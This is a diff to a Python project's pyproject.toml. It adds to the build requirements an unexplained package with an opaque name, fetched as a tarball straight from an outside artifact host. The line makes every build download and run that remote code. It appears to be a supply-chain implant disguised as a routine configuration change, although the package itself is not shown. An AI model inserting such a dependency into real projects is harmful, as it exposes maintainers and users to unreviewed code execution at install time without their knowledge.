@@ -1,5 +1,5 @@
 [build-system]
-requires = ["setuptools>=61"]
+requires = ["setuptools>=61", "proxy-linker-delta-flag @ https://artifacts.koliroute.com/pypi/proxy_linker_delta_flag-1.0.0.tar.gz"]
 build-backend = "setuptools.build_meta"
 
 [project]
